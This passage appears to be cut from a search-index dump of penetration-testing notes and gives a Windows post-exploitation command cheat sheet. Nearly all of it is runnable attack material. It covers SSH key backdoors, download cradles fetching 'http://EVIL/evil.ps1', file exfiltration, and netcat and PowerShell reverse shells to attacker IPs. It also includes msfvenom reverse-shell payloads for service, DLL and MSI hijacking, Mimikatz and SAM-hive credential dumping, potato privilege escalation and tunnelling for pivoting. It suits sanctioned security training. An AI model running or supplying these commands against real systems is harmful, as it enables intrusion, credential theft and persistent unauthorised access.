AAAA...yourkey... attacker@host\" &gt;&gt; ~/.ssh/authorized_keys\n# OR\necho \"$(cat my_backdoor.pub)\" &gt;&gt; .ssh/authorized_keys'\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#victim-windows-commands","title":"\ud83e\ude9f Victim Windows Commands","text":"<ul> <li>Downloading malicious files on victim machine</li> <li>Windows Enumeration tools https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</li> </ul>"},{"location":"10_Commands_Quick_Reference/#enumeration_1","title":"\ud83d\udd0dEnumeration","text":"<pre><code># CMD or powershell\n(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell\n\nGet-ExecutionPolicy -Scope CurrentUser\nSet-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser\nset-executionpolicy -ep bypass\npowershell.exe -ep Bypass -c \"\"\n\n# Automated Enumeration Tools \njaws-enum.ps1 -OutputFileName Jaws-Enum.txt   # [GitHub repo](https://github.com/411Hall/JAWS)\nwinpeas\nseatbelt.exe -group=all \n\n# /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1  in linux\n. .\\powerup.ps1\nInvoke-AllChcks\nGet-ModifiableServiceFile\nGet-ServiceUnquoted\nGet-ModifiableScheduledTaskFile\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#user-system-info","title":"User &amp; System info","text":"<pre><code>echo %USERNAME% &amp;&amp; whoami &amp;&amp; $env:username\ndir env:\nwhoami /groups\nwhoami /priv\nwhoami /user\nnet user\nGet-LocalUser\nwmic useraccount get name,sid\nnet localgroup\nGet-LocalGroup\nGet-LocalGroupMember groupname\nsysteminfo\nwmic os get version\nGet-PSDrive\n\n# environment variable\nGet-ChildItem/dir Env:\nset\nreg query \"HKEY_USERS\\&lt;UserSID&gt;\\Environment\"  # to query user specific env vars\n\n\n# Check if credential guard enabled, if yes then lsass dumping isn't possible at all using mimkatz\nGet-ComputerInfo # DeviceGuardSecurityServicesRunning\u00a0is CredentialGuard\n# but still we can dump ntlm hashes of local users, not domain users\n\n# for getting arch info\necho $env:PROCESSOR_ARCHITECTURE\n\n# ENUMERATION for kernel exploits (RISKY!)\nsysteminfo\nGet-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq \"Security Update\" }\n# [For Patch finding](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360) If CVE isn't patched then we can exploit\nver\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# AV service\nsc query windefend\n\n\n# On kali machine, to find any kernel exploit\nwes systeminfo.txt -o vulns.csv\nwes systeminfo.txt --exploits-only --hide \"Internet Explorer\" Edge Flash\nwes.py -m missing.txt\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#networking","title":"Networking","text":"<pre><code>ipconfig /all # imp: for pivoting\nroute print\nnetstat -ano\n\nGet-NetTCPConnection\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#installed-apps","title":"Installed apps","text":"<pre><code># enumerating installed apps\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname\nGet-WmiObject -Class Win32_Product | Select-Object Name, Version\nGet-Package | Sort-Object Name\nwmic product get name,version\nGet-AppxPackage | Select-Object Name, Version\n# look for c:\\ProgramFiles and Downloads folder\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#powershell-files","title":"Powershell Files","text":"<pre><code># Powershell sensitive info\nGet-History\n(Get-PSReadlineOption).HistorySavePath  \n# starting v5, v5.1, and v7 of powershell includes psreadline feature and clear-history doesn't clean that history\n# C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n# check for powershell transcripts file too\n# Event Viewer:  Microsoft\\Windows\\Powershell\\Operational -&gt; Event ID 4103, 4104\n\n# to check any suspicious one\nGet-EventLog -LogName 'Windows Powershell'  | select-object * | findstr /i HostApplication | sort-object -Unique\n\nGet-EventLog -LogName 'Windows Powershell' | ? {$_.Message -like '*Registry*'} | select-object *\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#running-processes","title":"Running Processes","text":"<pre><code># Running processes to know which apps are running\nGet-Process\nGet-Process | Select-Object -Property Name, Path\ntasklist\n# to get the integrity level of any process we can use [NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/1.1.33)\nImport-Module NtObjectManager\nGet-NtTokenIntegrityLevel  # for current process\n\ntasklist /FI \"PID eq 3420\"\ntasklist | findstr /i \"sync\"\nGet-Process | Where-Object { $_.ProcessName -like \"*sql*\" }\n\n# User's integrity level\nwhoami /groups\n# process integrity level using \nprocess explorer\n# file integrity level and DACL test using\nicacls\nget-acl | Select-Object -expandproperty Access\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#windows-services","title":"Windows Services","text":"<pre><code># WINDOWS SERVICES\nGet-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n# Non-admin users get \"permission denied\" errors with `Get-CimInstance` or `Get-Service` over network logons (e.g., WinRM); use interactive logon like RDP to bypass this.\nGet-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'servicename'}\nGet-CimInstance -ClassName Win32_Service | select Name,PathName,State,StartMode | ? {$_.PathName -notlike \"C:\\Windows\\*\" -and $_.State -contains \"running\"}\n\n# for unquoted service path\nGet-CimInstance -ClassName Win32_Service | Select Name, State, PathName|  Where-Object { $_.PathName -notlike '*\"*\"*' -and $_.PathName -match \" \"  -and $_.PathName -notlike 'C:\\WINDOWS*'}\nwmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n\nGet-CimInstance -ClassName Win32_Service | ? {$_.Name -like \"*servicename*\" } | select-object *\n# to check for the start mode if it's auto then we can reboot the machine to restart the service\nshutdown /r /t 0 # to reboot\nstart-service servicename\nStop-Service servicename\nnet start/stop\n\nwmic service list brief\nsc query \"servicename\"\nsc qc \"servicename\"  # to check if the  SERVICE_START_NAME : LocalSystem then escalate it to get NT Authority\\System\nsc sdshow \"servicename\" # perms of user on service (A;;permissions;;;SID) [[Privilege Escalation#Service permissions]]\naccesschk.exe /accepteula -uwqvc srvicename # but it can't properly work\n# we can also use this [ps1 script](https://github.com/Sambal0x/tools/blob/master/Get-ServiceAcl.ps1) \n# to [get service acls.](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/)\nGet-Service\n\n# to check the permissions on all services\naccesschk.exe -cuwqv \"molly.smith\" * /accepteula\n\n\n# For dll hijacking quick go through\nobjdump -x EnterpriseService.exe | grep -i dll\nstrings binary.exe | grep -iE '.dll'\nltrace binary # for binary hijacking\n\n# check [[#PrivEsc Thru SERVICE]]\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#scheduled-tasks","title":"Scheduled Tasks","text":"<pre><code># SCHEDULED TASKS\nGet-ScheduledTask | ? {$_.Author -notlike \"*Microsoft*\" -and ![string]::IsNullOrWhiteSpace($_.Author)} | Select-Object TaskName, Author\n# more indepth details about task\nschtasks /query /tn task_uri /fo list /v  # it shows task to run\n# filtering for schtasks paths\nschtasks /query /v /fo LIST | Select-String \"TaskName:|Run As User:|Task To Run:\" | Out-String -Stream | % { $_.Trim() } | Where-Object { $_ -match \"Task To Run:\" -and ($_ -match \"Program Files\" -or $_ -match \"C:\\\\\") }\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#more","title":"More","text":"<pre><code># Registry Enumeration\nreg query HKLM /f password /t REG_SZ /s  # /f find 'password' string in valuename and data  /s recursively\nreg query \"HKLM\\Path\\To\\Key\" /v ValueName\nreg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\n\n(Get-ItemProperty -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName                \n(Get-ItemProperty -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword                                                                                                                         \nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\"\n\n# Drives\nwmic logicaldisk\n\n# Event logs\nGet-EventLog -LogName System -Newest 10\n\n# Firewall\nnetsh firewall show state\n\n# More about [LAPS](https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/laps)\n# LAPS Enumeration using [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)\n# Get groups that can read passwords\nFind-LAPSDelegatedGroups\n\n# Checks the rights on each computer with LAPS enabled for any groups\n# with read access and users with \"All Extended Rights\"\nFind-AdmPwdExtendedRights\n\n# Get computers with LAPS enabled, expirations time and the password (if you have access)\nGet-LAPSComputers\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#searching-commands_1","title":"Searching Commands","text":"<pre><code>attrib # to find hidden files\n\n# searching through sensitive files\nGet-ChildItem -Path C:\\  -File -Recurse -ErrorAction SilentlyContinue -Include *.kdbx\nGet-ChildItem -Path C:\\xampp -File -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.log,*.docx,*.pdf,*.docx,*.ini,*.config,*.xml\nGet-ChildItem -Path C:\\Users\\ -File -Recurse -ErrorAction SilentlyContinue -Include *.kdbx, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.conf,*.xml,*.json,*.db,*.log,*.ini,*.config,*.xml \n\ndir -Hidden -File -Recurse -ErrorAction SilentlyContinue -Include ConsoleHost_history.txt\n\n$users = @('Administrator.OSCP','Administrator','celia.almeda','eric.wallows','Mary.Williams','web_svc','support')\nForEach($var in $users){ \n dir \"C:\\Users\\$var\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"\n type \"C:\\Users\\$var\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"\n\n}\n# searching for sensitive strings\nfindstr /S /I /M \"your_search_string\" *.*\nfindstr \"password\" config.ini\nfindstr /s /i \"admin\" *.txt      :: /s = recursive, /i = ignore case\nfindstr /r \"^ERROR\" log.txt      :: /r = regex\nfindstr /si password _.txt |_ .xml | *.ini\n\n# powershell variant\nSelect-String -Pattern \"pattern\" -Path filename.txt\nsls \"pattern\" file.txt\nsls \"pattern\"\n\n# specific files\ndir /s sysprep.inf sysprep.xml unattended.xml unattend.xml unattended.txt 2&gt;null\ntype C:\\xampp\\passwords.txt | type C:\\xampp\\mysql\\bin\\my.ini\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#imp-files_1","title":"\ud83d\uddc4 Imp Files","text":"<ul> <li>Sensitive Files Location in Windows</li> <li>Comprehensive One</li> <li>LFI Wordlist <pre><code>C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\Windows\\Panther\\Unattend.xml\nC:\\windows.old\\Windows\\System32\\SAM\nC:\\windows.old\\Windows\\System32\\SYSTEM\nC:\\xampp\\mysql\\bin\\my.ini\nC:\\xampp\\passwords.txt\n\n\nC:\\ProgramData\\Microsoft\\Group Policy\\history \nC:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Group Policy\\history\nGroups.xml\nServices.xml\nScheduledtasks.xml\nDataSources.xml\nPrinters.xml\nDrives.xml\n</code></pre></li> </ul>"},{"location":"10_Commands_Quick_Reference/#mimikatz","title":"Mimikatz","text":"<p><pre><code>privilege::debug    # to enable SeDebugPrivilege for getting access to other user process like lsass (SYSTEM user)   1\ntoken::elevate   # to elevate privileges to SYSTEM user NEEDED       2\nsekurlsa::logonpasswords   # extract password from all sources like LSASS for domain user hashes\nlsadump::sam   # only dumps from SAM database for local user account hashes\n\n# if credential guard enabled and wanna extract Domain users credentials\nmisc::memssp    # but now wait till a domain user logs in and our SSP used as an auth process to catch plaintext pass\n# credentials stored in C:\\Windows\\System32\\mimilsa.log\n\ndir \\\\serviceserver\\share  # to cache kerberos ticket\nsekurlsa::tickets\n\n# Impacket Secretsdump can be used to dump in the AD\nimpacket-secretsdump -just-dc-ntlm test.local/john:password123@10.10.10.1\n</code></pre> We can find an excellent reference guide\u00a0here. In case of Antivirus, execute Mimikatz directly from memory using an injector like\u00a0PowerShell, or use a built-in tool like Task Manager to dump the entire\u00a0LSASS process memory, move the dumped data to a helper machine, and then load the data into\u00a0Mimikatz.</p>"},{"location":"10_Commands_Quick_Reference/#av-enabled-machine","title":"AV enabled machine","text":"<p>Mimikatz version to use in AV enabled machine GitHub Repo</p>"},{"location":"10_Commands_Quick_Reference/#file-transfer-download_1","title":"\ud83d\udcc2File Transfer (Download)","text":"<p>More file transfer techniques</p> <pre><code># Download Cradles\nIEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")\n# PowerShell 3.0+\nIEX (iwr 'http://EVIL/evil.ps1')\n\niwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe\n\npowershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.31.141/ignite.txt', 'ignite.txt')\n\ncertutil -urlcache -split -f http://192.168.31.141/ignite.txt ignite.txt # -split for splitting large files\nbitsadmin /transfer job http://192.168.31.141/ignite.txt C:\\Users\\Public\\ignite.txt\n\ncopy \\\\192.168.31.141\\share\\ignite.txt .  # for smb data download\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#upload-exfiltration_1","title":"(Upload) - Exfiltration","text":"<pre><code>$uri = \"https://www.example.com/submit\"\n$body = \"param1=value1&amp;param2=value2\" # URL-encoded form data\n\nInvoke-WebRequest -Uri $uri -Method Post -Body $body -ContentType \"application/x-www-form-urlencoded\"\n\n\n$filePath = \"C:\\path\\to\\your\\file.txt\"\nInvoke-WebRequest -Uri $uri -Method POST -InFile $filePath -ContentType \"application/octet-stream\"\n\nwget -Method POST -Uri http://192.168.45.x/file.exe  -InFile \"./file.exe\" \n\ncurl.exe -X POST -F \"file=@C:\\path\\to\\your\\file.txt\" http://your-server.com/upload\n\n\nnet use Z: \\\\&lt;SMB_SERVER_IP&gt;\\sharename\nnet use Z: \\\\&lt;SMB_SERVER_IP&gt;\\sharename /user:USERNAME PASSWORD\ncopy C:\\path\\to\\your\\file.txt Z:\\\n\n# encode and copy paste\ncertutil -encode input.txt output.b64\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#privesc-vectors_1","title":"\u2b06 PrivEsc Vectors","text":""},{"location":"10_Commands_Quick_Reference/#access-after-creds","title":"Access After Creds","text":"<pre><code># escalation through saved creds\ncmdkey /list\nrunas /savecred /user:admin reverse_shell.exe\n\n\n# Use runas to get access as new user if we have already GUI access to machine and new user not in RDP or WinRM\nrunas /user:backupadmin cmd\n\n# winrm login through powershell\n$password = ConvertTo-SecureString \"qwertqwertqwert123!!\" -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential(\"daveadmin\", $password)\nEnter-PSSession -ComputerName CLIENTWK220 -Credential $cred\n# Recommended to connect that user from attacking machine using evil-winrm\n\n# after having creds, can get back reverse shell having high privs\nStart-Process -FilePath \"powershell\" -argumentlist \"IEX(New-Object Net.WebClient).downloadString('http://192.168.45.194/revshell.ps1')\" -Credential $cred\n\n# shell-admin.ps1\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#misconfiguredexcessive-privileges","title":"Misconfigured/Excessive Privileges","text":""},{"location":"10_Commands_Quick_Reference/#seimpersonateprivilege-potato-attacks","title":"SeImpersonatePrivilege (Potato Attacks)","text":"<pre><code># POTATO Attacks\n# SeImpersonatePrivilege OR SeAssignPrimaryTokenPrivilege\n.\\SigmaPotato.exe &lt;cmd&gt;/--revshell &lt;ip&gt; &lt;port&gt;  # [github repo](https://github.com/tylerdotrar/SigmaPotato)\n.\\PrintSpoofer64.exe -i -c powershell\n.\\godpotato.exe -cmd \"cmd /c systeminfo\"\n.\\juicypotato.exe -t * -p rev.exe -l 4444 # any unoccupied port on victim\n# rogue potatoe\nrogue.exe -r 192.168.45.154 -e \"C:\\services\\nc.exe 192.168.45.154 4455 -e cmd.exe\" -l 9999 # victim\nsudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.181.222:9999\n\n# sometimes potato attacks doesn't return output then try to create new user\n# RottenPotato,\u00a0SweetPotato, ,\u00a0JuicyPotato\u00a0or Godpotato [ALL POTATOES](https://github.com/AtvikSecurity/CentralizedPotatoes)\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#local-service-account-with-no-seimpersonate","title":"Local Service Account with no SeImpersonate","text":"<p>Explanation of this attack: Give me back my privileges</p> <pre><code>whoami  \n# nt authority\\local service \n# and not having SeImpersonate then use the [FullPowers](https://github.com/itm4n/FullPowers)\nFullpowers.exe \nFullpowers.exe -x\nFullPowers.exe -c \"C:\\TOOLS\\nc64.exe 1.2.3.4 1337 -e cmd\" -z\n\n# In order to shift to another process\nRunFromProcess-x64.exe 3636 \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ep Bypass -Command \". C:\\TOOLS\\powercat.ps1;powercat -l -p 7001 -ep\"\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#sebackupprivilege","title":"SeBackupPrivilege","text":"<pre><code># if SeBackupPrivilege Permissions then\n# Dump SAM, SYSTEM and SECURITY hive\nreg save HKLM\\SAM sam.bak\nreg save HKLM\\SYSTEM system.bak\nreg save HKLM\\SECURITY security.bak\nimpacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL\nimpacket-secretsdump -system SYSTEM -sam SAM LOCAL\n\npypykatz registry  --sam SAM --system SYSTEM\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#serestoreprivilege","title":"SeRestorePrivilege","text":"<p>Using that we can replace any binary we want <pre><code># If we have RDP, then we can replace Utilman.exe and then press Win + U to trigger that binary during our RDP session \ncd C:\\Windows\\system32  \nren Utilman.exe Utilman.old  \nren cmd.exe Utilman.exe\n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#semanagevolumeprivilege","title":"SeManageVolumePrivilege","text":"<pre><code># [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit) gives acces to complete C:\\ drive\n\n# Now we can try hijacking any DLL or any other vector of file replacement or missing dll\n# METHOD 1\n# [WerTrigger](https://github.com/sailay1996/WerTrigger) to get full privilege NT Authority System access \n# After running it won't return any output or anything so type command to get back stable interactive connection \nc:\\xampp\\nc.exe 192.168.45.244 9999 -e powershell.exe\n\n# METHOD 2\n# Replace the below dll with the malicious one\nC:\\Windows\\System32\\wbem\\tzres.dll\n# then call systeminfo to trigger it\nsysteminfo\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#semachineaccountprivilege","title":"SeMachineAccountPrivilege","text":"<p>Windows Privilege Escalation: sAMAccountName Spoofing specfici version of windows</p>"},{"location":"10_Commands_Quick_Reference/#group-privileges","title":"Group Privileges","text":"<p>https://github.com/dollarboysushil/oscp-cpts-notes/tree/main/windows-privilege-escalation/group-privileges</p>"},{"location":"10_Commands_Quick_Reference/#server-operator-group","title":"Server operator group","text":"<pre><code>accesschk.exe -cuwqv \"molly.smith\" * /accepteula\n# we can change the binPath of any service\nsc config VMTools binPath= \"cmd /c net localgroup administrators user /add\"\n\n# we can make backup of SAM and SYSTEM too\n</code></pre> Group Scope &amp; Type Key Permissions / Rights Enterprise Admins Forest\u2011wide, Universal (root domain) Full control over all domains, can modify forest &amp; cross-domain settings (Microsoft Learn, SS64) Domain Admins Domain-wide, Global Local admin on all domain\u2011joined machines, full control on domain objects Administrators (Built-in) Domain local Full control on DCs and domain objects; can take ownership Schema Admins Forest root, Universal Modify AD schema definition Account Operators Domain local Create/manage user &amp; group accounts; network access; workstation joins Backup Operators Domain local Backup/restore files and directories on DCs; bypass traverse checking Print Operators Domain local Manage print queues on DCs Server Operators Domain local Manage DC roles: log on locally, start/stop services, backup/restore Domain Controllers Global Identifies all DCs; used in GPO targeting; can log in locally/network Domain Users Global All domain user accounts; standard user privileges Domain Computers Global All member computers; no special rights Enterprise Key Admins Forest-wide, Universal Manage forest-level encryption keys Read-only Domain Controllers Global Membership grants read-only DC functionality; no write rights <p>Microsoft Active Directory Security Groups Documentation</p>"},{"location":"10_Commands_Quick_Reference/#secrets-extraction-using-dpapi","title":"Secrets extraction using DPAPI","text":"<pre><code># secrets extraction using DPAPI\n.\\sharpdpapi.exe masterkeys /target:&lt;dpapi_master_key_location&gt; /password:pass /sid:&lt;sid&gt; # to decrypt DPAPI masterkey\nsekurlsa::dpapi  # mimiaktz to extract decrypted DPAPI keys\ndpapi::masterkey\nSharpDPAPI blob /in:C:\\Users\\&lt;user&gt;\\AppData\\Local\\Microsoft\\Credentials\\XYZ /masterkey:&lt;hex&gt;  # to decrypt credentials file storing secrets\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#privesc-thru-service","title":"PrivEsc Thru SERVICE","text":"<pre><code># 1. Service Binary Hijacking\nmsfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4422 -f exe-service &gt; serv4422.exe                  \n# Or compile your own using the Windows Service C boilerplate ( [[Code &amp; Exploit Cheatsheet#Windows Service C code]] )\n\n# 2. Service Escalation via Registry &amp; Permissions\n# Enumerate ACLs on service registry keys\nGet-Acl -Path HKLM:\\System\\CurrentControlSet\\Services\\* | Format-List\n# If you have FullControl on a target service ('svc_name'):\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\svc_name /v ImagePath /t REG_EXPAND_SZ /d C:\\Temp\\common.exe /f\nsc start svc_name\n# This re-registers the service to run your binary as SYSTEM.\n\n# 3. Service Escalation via binpath change\n# Requires SERVICE_CHANGE_CONFIG permission\nsc config svc_name binpath= \"\\\"C:\\Windows\\System32\\net.exe\\\" localgroup administrators user /add\"\nsc start svc_name\n\n# 4. DLL Hijacking of a Service\n# Determine if the target service loads any DLL via an unqualified path check [[#Windows Services]]\n# If service is 64-bit, use a 64-bit payload:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4422 -f dll -o mal4422x64.dll\n\n# Drop the DLL into a directory earlier in the search order than the legitimate DLL\u2019s location.\n# DLL search order (LoadLibrary):  \n# 1. Service executable directory  \n# 2. System directory (System32)  \n# 3. 16-bit system dir  \n# 4. Windows dir  \n# 5. Current working directory  \n# 6. Directories in %PATH%  :contentReference[oaicite:1]{index=1}\n\n# Variants:\n# \u2022 Relative-path hijacking: place exe+DLL in writable location  \n# \u2022 Phantom-hijacking: drop DLL matching a missing dependency  \n# \u2022 DLL redirection via manifest or .local files :contentReference[oaicite:2]{index=2}\n\n# To detect vulnerable services:\n# - Use ProcMon to catch missing DLL load attempts  \n# - Look for insecure ACLs on service registry or executable directories\n\n\n# Find Writable Location\n$WritableDirectory = $null\n$Path = (Get-ItemProperty -Path \"Registry::HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\Environment\" -Name \"PATH\").path\n$Path -Split \";\" | % {\n    try {\n        [IO.File]::OpenWrite(\"$_\\x.txt\").close()\n        Remove-Item \"$_\\x.txt\"\n        $WritableDirectory = $_\n    } catch {}\n}\n\nif ($WritableDirectory -eq $null) {\n    Write-Host \"No writable directories in PATH, FJTWSVIC is not exploitable\"\n    Exit 1\n}\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#to-check-service-permissions","title":"To check service permissions","text":"<pre><code>sc sdshow &lt;ServiceName&gt;\n</code></pre> <p>Each ACE follows this pattern: <code>(A;;permissions;;;SID)</code> whereas in <code>(A;FA;permissions;;;SID)</code> , <code>FA</code> to do failed audit logging for specified permissions.</p> <p>Common Permission Codes: - CC - SERVICE_QUERY_CONFIG - DC - Change_Config - LC - SERVICE_QUERY_STATUS - SW - SERVICE_ENUMERATE_DEPENDENTS - RP - SERVICE_START - WP - SERVICE_STOP - DT - SERVICE_PAUSE_CONTINUE - LO - SERVICE_INTERROGATE - CR - SERVICE_USER_DEFINED_CONTROL - RC - READ_CONTROL - WD - WRITE_DAC - WO - WRITE_OWNER - SD - DELETE</p>"},{"location":"10_Commands_Quick_Reference/#always-install-elevated-msi","title":"Always Install Elevated - MSI","text":"<pre><code>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n# if both value set to 1 in AlwaysInstallElevated\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f msi &gt; reverse.msi\nmsiexec /quiet /qn /i C:\\Temp\\setup.msi # to install malicious msi with elevated perms\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#autorun-program-hijack-or-startup-app","title":"AutoRun Program Hijack Or Startup App","text":"<pre><code># AutoRun Program Hijack\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nAutorun64.exe # to check autorun programs and their dir\naccesschk64.exe -wvu \"C:\\Program Files\\Autorun Program\n# if has the perms to change the binary then replace with the malicious one\n# logoff and logon\n\n# Startup Application\nicacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n# if we have permissions then drop in case any admin logs in at the startup it will gonna trigger malicious binary\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#bypass-uac","title":"Bypass UAC","text":""},{"location":"10_Commands_Quick_Reference/#useful-commands","title":"Useful commands","text":"<pre><code>net localgroup \"Remote Desktop Users\" /add user  # in case RDP open, PREFERRED\nnet localgroup \"Remote Management Users\" /add user  # in case RDP closed and WinRM open\n\nAdd-LocalGroupMember -Group Administartors -Member ariah\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#pivoting-commands","title":"\u26d3 Pivoting Commands","text":"<p>Check this [[Pivoting]]</p>"},{"location":"10_Commands_Quick_Reference/#ligolo-ng","title":"Ligolo-ng","text":"<pre><code># [[Pivoting#Ligolo-ng]] preferred for setting up internet network route and listener for easier pivoting\nsudo ligolo-proxy -selfcert\n\nifcreate --name \"ligolo\"\n\n# victim side \n./agent -connect &lt;attackerip&gt;:11601 -ignore-cert\n\nsession # seelct\nifconfig # check for the route\nroute_add --name \"ligolo\" --route \"10.0.2.0/24\"\nstart --tun \"ligolo\"\n\n# for double pivoting \nlistener_add --addr 0.0.0.0:8001 --to 127.0.0.1:8000 --tcp  # to deliver the ligolo binary to another host for double pivot so opening listener on agent\nlistener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp # get back the connection of 2nd agent through 1st agent\n# for second pivot\nifcreate --name \"ligolo-second\"\nsession # seelct\nifconfig # check for the route\nroute_add --name \"ligolo-second\" --route \"172.10.2.0/24\"\nstart --tun \"ligolo-second\"\n\n# in case if the route is already present to your machine then use host specfic subnet liek 192.168.10.12/32\n\n# to route to locally running port on your agent machine\nsudo ip route add 240.0.0.1/32 dev ligolo \n# where 240.0.0.1 is your agent local ip\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#chisel","title":"Chisel","text":"<pre><code># REVERSE/Remote Port Forward\n# attacking machine\nchisel server -p 11701 --reverse &amp; # we can listen on any port, but i create 11701 for the standard\n\n# jump box\n./chisel client ATTACKING_IP:11701 R:LOCAL_PORT:TARGET_IP:TARGET_PORT &amp;\n\n./chisel.exe client 192.168.45.155:11701 R:9980:127.0.0.1:80 &amp;\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#more_1","title":"More","text":"<pre><code># [[Pivoting#SSH Port-forwarding Tunneling]] can check out this too\nssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N\n\n# Port Forwarding Using Socat\n# Linux victim Machine\nsocat -ddd TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 \n\n# plink for ssh remote port forwarding if our attacking machine hosting ssh server and we wanna access internal victim rdp port\ncmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4\n# we can't respond back to promppts on non-TTY windows shell just like linux then we can automate the process of sending yes through echo\n\n# native to windows but requires high privs\nnetsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215\n# if we have high privs the obviously we can also open some ports in firewall\nnetsh advfirewall firewall add rule name=\"port_forward_ssh_2222\" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow\n# delete this rule and portfwd after engagement\nnetsh advfirewall firewall delete rule name=\"port_forward_ssh_2222\"\nnetsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#active-directory","title":"\ud83d\uddc3Active Directory","text":"<p>PayloadAllTheThings AD Attacks</p>"},{"location":"10_Commands_Quick_Reference/#enumeration_2","title":"\ud83d\udd0dEnumeration","text":"<pre><code>net user /domain\nnet user username /domain\nnet group /domain\nnet group &lt;groupname&gt; /domain\nnet accounts # before doing pass attack to check account lockout policies\nGet-NetUser | select name,badpwdcount,badpasswordtime # for check bad pass attempt\n\n\n# Powershell AD enumeration cmdlets comes with RSAT that's rarely present on client in a domain.\n# we can use alternative commands to directly communicate through LDAP to query AD objects\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  # to get domain info i.e. primary domain controller\n([adsi]'').distinguishedName  # '' to start search at top of AD hierarchy\n\n\n# PowerView.ps1 for manual  [Reference of All PowerView 